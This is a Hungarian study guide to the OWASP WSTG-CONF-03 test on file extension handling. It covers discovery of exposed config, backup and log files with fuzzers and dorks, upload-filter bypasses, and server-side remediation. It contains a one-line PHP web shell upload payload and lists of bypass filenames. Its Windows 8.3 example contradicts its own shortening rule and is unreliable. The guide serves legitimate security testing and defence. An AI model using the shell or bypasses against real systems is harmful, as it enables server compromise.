# WSTG-CONF-03: File Extension Kezelés Tesztelése Érzékeny Információkra

## Mi a fejezet lényege?

Ez a fejezet arról szól, hogy a **webszerverek hogyan kezelik a különböző file extension-öket** (`.php`, `.inc`, `.bak`, `.config`, stb.), és hogy **rossz konfiguráció** esetén **érzékeny fájlok letölthetővé válhatnak** (source code, credentials, backupok). Illetve a **file upload filter bypass** lehetőségekről Windows 8.3 filename handling miatt.

⚠️ **NE KEVERD ÖSSZE:** Ez NEM általános file upload vulnerability testing! Ez **specifikusan file extension handling** - milyen extension-ök vannak engedélyezve, melyek futtatódnak server-side, és melyek letölthetők.

---

## Mi a cél?

**Brute-force sensitive file extension-öket**, amelyek:
- Raw data-t tartalmazhatnak (scripts, credentials)
- Source code-ot felfedhetnek
- Backup fájlokat tartalmaznak

**Validálni**, hogy:
- Nincs system framework bypass
- Upload filter-ek nem kerülhetők meg

---

## 2 Fő Tesztelési Terület

### 1. **Forced Browsing** (File Extension Discovery)
### 2. **File Upload** (Extension Filter Bypass)

---

## 1. Forced Browsing - Sensitive File Extensions

### Concept:
**Webszerverek rosszul konfigurálva** bizonyos file extension-öket **source code-ként szolgálnak ki** ahelyett, hogy futtatnák őket.

### Veszélyes File Extensions:

#### CRITICAL - Soha ne legyenek letölthetők:

| Extension | Típus | Mit tartalmaz |
|-----------|-------|---------------|
| `.inc` | PHP Include | Database credentials, config |
| `.asa` | ASP Global | Application settings |
| `.config` | Config file | Connection strings, keys |
| `.conf` | Config | Server/app configuration |
| `.cfg` | Config | Settings |
| `.ini` | Config | Configuration parameters |

---

### Példa - connection.inc Vulnerability:

**Tesztelés:**
```bash
curl https://pelda.hu/includes/connection.inc
```

**Ha a szerver rosszul van konfigurálva:**
```php
<?
    mysql_connect("127.0.0.1", "root", "password")
        or die("Could not connect");
?>
```

**Mit látsz:**
- ✅ Database hostname: 127.0.0.1
- ✅ Database username: root
- ✅ **Database password: password** ← CRITICAL!

**Miért történik:**
- `.inc` fájl nincs társítva PHP handler-hez
- Szerver text/plain-ként szolgálja ki
- Source code disclosure

---

### HIGH RISK - Ellenőrizni kell:

| Extension | Típus | Potenciális probléma |
|-----------|-------|---------------------|
| `.bak` | Backup | Old source code, credentials |
| `.old` | Backup | Previous versions |
| `.orig` | Backup | Original files |
| `~` | Emacs backup | Source code backup |
| `.swp` | Vim swap | Temporary editing files |
| `.tmp` | Temporary | Sensitive data |
| `.log` | Log files | Debug info, errors, IPs |

---

### MEDIUM RISK - Általában letölthetőek, de ellenőrizni:

| Extension | Típus | Mit nézz |
|-----------|-------|----------|
| `.zip`, `.tar`, `.gz`, `.rar` | Archive | Mi van benne? Source? Backups? |
| `.java` | Source | Java source code |
| `.txt` | Text | Credentials? Internal docs? |
| `.pdf` | Document | Confidential documents? |
| `.docx`, `.xlsx`, `.pptx` | Office | Sensitive data? |
| `.sql` | Database | Database dump? |
| `.xml` | Data | Configuration? API keys? |

---

### Tool #1: **curl - Manual Extension Testing**

#### Parancsok:
```bash
# .inc file check
curl https://pelda.hu/config.inc
curl https://pelda.hu/includes/db.inc
curl https://pelda.hu/lib/connection.inc

# .config file
curl https://pelda.hu/web.config
curl https://pelda.hu/app.config

# .bak files
curl https://pelda.hu/index.php.bak
curl https://pelda.hu/login.php.old
curl https://pelda.hu/admin.php.orig

# Emacs backup (~)
curl https://pelda.hu/config.php~

# Vim swap
curl https://pelda.hu/.config.php.swp

# SQL dumps
curl https://pelda.hu/backup.sql
curl https://pelda.hu/database.sql

# Log files
curl https://pelda.hu/error.log
curl https://pelda.hu/access.log
curl https://pelda.hu/debug.log
```

---

### Tool #2: **gobuster - Extension Brute-force**

#### Parancsok:
```bash
# Common sensitive extensions
gobuster dir -u https://pelda.hu -w /usr/share/wordlists/dirb/common.txt -x inc,config,bak,old,orig

# Specific directory
gobuster dir -u https://pelda.hu/includes/ -w wordlist.txt -x inc,conf,ini

# PHP backups
gobuster dir -u https://pelda.hu -w php-files.txt -x bak,old,orig,~,swp

# Archive files
gobuster dir -u https://pelda.hu -w wordlist.txt -x zip,tar,gz,rar,7z

# Database files
gobuster dir -u https://pelda.hu -w wordlist.txt -x sql,db,sqlite
```

---

### Tool #3: **ffuf - Fast Extension Fuzzing**

#### Parancsok:
```bash
# Extension fuzzing
ffuf -u https://pelda.hu/FUZZ -w wordlist.txt -e .inc,.bak,.old,.config

# Combined file + extension fuzzing
ffuf -u https://pelda.hu/FUZZv2 -w files.txt:FUZZ -w extensions.txt:v2

# Backup file patterns
ffuf -u https://pelda.hu/config.phpFUZZ -w backup-extensions.txt -mc 200
```

**Backup extensions wordlist:**
```
.bak
.old
.orig
.backup
.tmp
~
.swp
.save
.copy
_old
_backup
```

---

### Tool #4: **wfuzz**

#### Parancsok:
```bash
# Extension fuzzing
wfuzz -c -w extensions.txt https://pelda.hu/config.FUZZ

# Hide 404 responses
wfuzz -c -w extensions.txt --hc 404 https://pelda.hu/index.phpFUZZ
```

---

### Gyakori Érzékeny Fájlok:

#### Configuration Files:
```bash
# PHP
/config.inc
/includes/config.inc
/lib/config.inc
/classes/db.inc

# .NET
/web.config
/app.config
/connectionStrings.config

# Java
/WEB-INF/web.xml
/META-INF/context.xml

# General
/config.ini
/settings.conf
/.env
```

---

#### Backup Files:
```bash
# PHP
/index.php.bak
/login.php.old
/admin.php.orig
/config.php~

# General
/backup.zip
/site-backup.tar.gz
/www.tar
/database.sql
```

---

#### Log Files:
```bash
/error.log
/access.log
/debug.log
/app.log
/error_log
/access_log
```

---

#### Source Code:
```bash
# Java
/src/main/java/com/example/App.java
/WEB-INF/classes/

# Python
/app.py
/views.py
/models.py

# Ruby
/config/database.yml
/config/secrets.yml
```

---

## 2. File Upload - Extension Filter Bypass

### Concept:
**Windows 8.3 legacy filename handling** lehetővé teszi file upload filter-ek megkerülését.

### Windows 8.3 Short Filename (SFN):

**Hogyan működik:**
```
Long filename:     file.phtml
Short filename:    FILE~1.PHT
```

**8.3 szabály:**
- **8 character** filename
- **3 character** extension
- Ha hosszabb → truncate + `~1`, `~2`, stb.

---

### Attack Scenario:

#### 1. Upload `.phtml` file:
```bash
# Upload
POST /upload HTTP/1.1
Content-Type: multipart/form-data

filename="shell.phtml"
content=<?php system($_GET['cmd']); ?>
```

**Server response:**
```
File uploaded: /uploads/shell.phtml
```

---

#### 2. Access via 8.3 short name:
```bash
# Próbálj meg futtatni
curl https://pelda.hu/uploads/shell.phtml
# → Blocked by filter (not .php extension)

# 8.3 short name
curl https://pelda.hu/uploads/SHELL~1.PHP
# → EXECUTED! (Expanded to .PHP by Windows)
```

**Miért működik:**
- Upload filter: `.phtml` ≠ `.php` → Engedélyezi
- Windows expands `SHELL~1.PHP` → `shell.phtml`
- IIS PHP handler: `.PHP` extension → Futtatja!

---

### Double Extension Attack:

#### Példa 1:
```bash
# Upload
filename="shell.php.jpg"

# Access
https://pelda.hu/uploads/shell.php.jpg
# → Apache: .jpg → Image
# → PHP handler misconfigured → Executes!
```

---

#### Példa 2 - Null Byte Injection:
```bash
# Upload (régi PHP verziók)
filename="shell.php%00.jpg"

# Server strips after null byte
# Saved as: shell.php
```

---

#### Példa 3 - Case Sensitivity:
```bash
# Upload
filename="shell.pHp"
filename="shell.PhP"
filename="shell.PHP"

# Filter checks: == ".php" (case-sensitive)
# → Bypass!
```

---

### Tool #1: **Manual Upload Testing**

#### Test Cases:
```
1. shell.phtml
2. shell.php5
3. shell.php7
4. shell.phps
5. shell.pht
6. shell.phar
7. shell.php.jpg
8. shell.php.txt
9. shell.php%00.jpg (null byte)
10. shell.PhP (case variation)
```

---

### Tool #2: **Burp Suite Intruder**

#### Használat:
```
1. Burp → Proxy → Intercept upload request
2. Send to Intruder
3. Position: filename="shell.§php§"
4. Payload: php, phtml, php5, php7, pht, phps, phar
5. Start attack
6. Nézd melyik uploadelódott
```

---

### Tool #3: **fuxploider**

```bash
# Telepítés
git clone https://github.com/almandin/fuxploider
cd fuxploider

# Használat
python3 fuxploider.py --url https://pelda.hu/upload --not-regex "error"
```

**Mit csinál:**
- Automatikusan próbál különböző extension-öket
- Double extensions
- Case variations
- Null byte injection
- MIME type checks

---

## Server-Specific Extension Handling

### Apache:

**httpd.conf vagy .htaccess:**
```apache
# PHP handler
AddType application/x-httpd-php .php

# Multiple extensions
AddType application/x-httpd-php .php .phtml .php5

# Security - block .inc files
<FilesMatch "\.inc$">
    Order allow,deny
    Deny from all
</FilesMatch>
```

**Tesztelés:**
```bash
# Ha .inc van engedélyezve
curl https://pelda.hu/config.inc
# → Source code disclosure!
```

---

### nginx:

**nginx.conf:**
```nginx
location ~ \.php$ {
    fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
    fastcgi_index index.php;
    include fastcgi_params;
}

# Block sensitive extensions
location ~* \.(inc|config|bak|old)$ {
    deny all;
}
```

---

### IIS:

**web.config:**
```xml
<configuration>
  <system.webServer>
    <security>
      <requestFiltering>
        <!-- Block extensions -->
        <fileExtensions>
          <add fileExtension=".inc" allowed="false" />
          <add fileExtension=".config" allowed="false" />
          <add fileExtension=".bak" allowed="false" />
        </fileExtensions>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

---

## Google Dorking - File Extension Discovery

### Parancsok (böngészőben):
```
# .inc files
site:pelda.hu ext:inc

# .bak files
site:pelda.hu ext:bak

# .config files
site:pelda.hu ext:config

# .sql dumps
site:pelda.hu ext:sql

# .log files
site:pelda.hu ext:log

# Backup archives
site:pelda.hu ext:zip OR ext:tar OR ext:gz
```

---

## Automated Scanner - Nikto

### Parancsok:
```bash
# Full scan (includes file extension checks)
nikto -h https://pelda.hu

# Specific tuning
nikto -h https://pelda.hu -Tuning 2,3,5

# Output
nikto -h https://pelda.hu -o nikto_report.html -Format html
```

**Mit keres:**
- Backup files (`.bak`, `.old`)
- Config files (`.inc`, `.config`)
- Source files (`.java`, `.cs`)
- Archive files

---

## Gyakorlati Workflow

### 1. Discovery Phase:
```bash
# Spider the site
gobuster dir -u https://pelda.hu -w common.txt -x php,inc,bak,old,config

# Check for common sensitive files
curl https://pelda.hu/config.inc
curl https://pelda.hu/web.config
curl https://pelda.hu/backup.zip
```

---

### 2. Extension Testing:
```bash
# Test various backup extensions
for ext in bak old orig backup tmp; do
    curl -I "https://pelda.hu/index.php.$ext"
done

# Test editor backups
curl https://pelda.hu/config.php~
curl https://pelda.hu/.config.php.swp
```

---

### 3. Google Dorking:
```
site:pelda.hu ext:inc
site:pelda.hu ext:bak
site:pelda.hu ext:sql
```

---

### 4. Upload Testing (if applicable):
```bash
# Manual upload with various extensions
# Test: .php, .phtml, .php5, .phps, .pht
# Test: double extensions (.php.jpg)
# Test: case variations (.PhP, .pHp)
```

---

## Gyakorlati Cheat Sheet

| Feladat | Parancs |
|---------|---------|
| .inc file check | `curl https://pelda.hu/config.inc` |
| Backup files | `curl https://pelda.hu/index.php.bak` |
| Extension brute-force | `gobuster dir -u URL -w wordlist -x inc,bak,old` |
| Google dorking | `site:pelda.hu ext:inc` |
| Nikto scan | `nikto -h https://pelda.hu` |
| Archive check | `curl https://pelda.hu/backup.zip` |
| Log files | `curl https://pelda.hu/error.log` |
| .env file | `curl https://pelda.hu/.env` |
| web.config | `curl https://pelda.hu/web.config` |

---

## Fontos Toolok

### Discovery:
- **gobuster** - Directory/file brute-force
- **ffuf** - Fast fuzzer
- **wfuzz** - Web fuzzer
- **dirsearch** - Web path scanner

### Scanners:
- **Nikto** - Web server scanner
- **Nessus** - Vulnerability scanner

### Upload Testing:
- **Burp Suite Intruder** - Extension fuzzing
- **fuxploider** - Automated upload bypass

### Manual:
- **curl** - HTTP requests
- **wget** - Download files

---

## Védelem (Remediation)

### 1. Block Sensitive Extensions (Apache):
```apache
<FilesMatch "\.(inc|config|bak|old|orig|log)$">
    Order allow,deny
    Deny from all
</FilesMatch>
```

---

### 2. Block Sensitive Extensions (nginx):
```nginx
location ~* \.(inc|config|bak|old|orig|log|sql)$ {
    deny all;
    return 403;
}
```

---

### 3. Block Sensitive Extensions (IIS):
```xml
<fileExtensions>
  <add fileExtension=".inc" allowed="false" />
  <add fileExtension=".config" allowed="false" />
  <add fileExtension=".bak" allowed="false" />
  <add fileExtension=".old" allowed="false" />
</fileExtensions>
```

---

### 4. Remove Backup Files:
```bash
# Find backup files
find /var/www/html -name "*.bak" -o -name "*.old" -o -name "*~"

# Delete them
find /var/www/html -name "*.bak" -delete
```

---

### 5. Proper File Upload Validation:
```php
// PHP - Whitelist approach
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($ext, $allowed)) {
    die("Invalid file type");
}

// MIME type check is
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);

if (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif'])) {
    die("Invalid MIME type");
}
```

---

### 6. Disable Windows 8.3 (if possible):
```powershell
# Windows Server
fsutil 8dot3name set 1

# Disable globally
fsutil behavior set disable8dot3 1
```

---

## Fontos Megjegyzések

✅ **`.inc`, `.config`, `.bak`** = CRITICAL - soha ne legyenek letölthetők!  
✅ **Backup files** (`.old`, `.orig`, `~`) gyakori hiba  
✅ **Windows 8.3** file handling bypass lehetőség  
✅ **Double extension** (`.php.jpg`) gyakori upload bypass  
❌ **Source code disclosure** = credentials, logic, vulnerabilities  
⚠️ **Google dorking** gyakran talál backup file-okat!  
⚠️ **Case-sensitive** filter-ek megkerülhetők (`.PhP`, `.pHp`)

---

**Összefoglalva:** Ez a fejezet a **file extension kezelés teszteléséről** szól. **Webszerverek rosszul konfigurálva** bizonyos extension-öket (`.inc`, `.config`) **source code-ként szolgálnak ki** credentials-szel. **Backup files** (`.bak`, `.old`, `~`) gyakran **érzékeny információkat** tartalmaznak. **File upload filter-ek** megkerülhetők **Windows 8.3 filename handling**, **double extensions** (`.php.jpg`), vagy **case variations** (`.PhP`) segítségével. **Forced browsing** (gobuster) és **Google dorking** hatékony módszerek sensitive file-ok felderítésére!
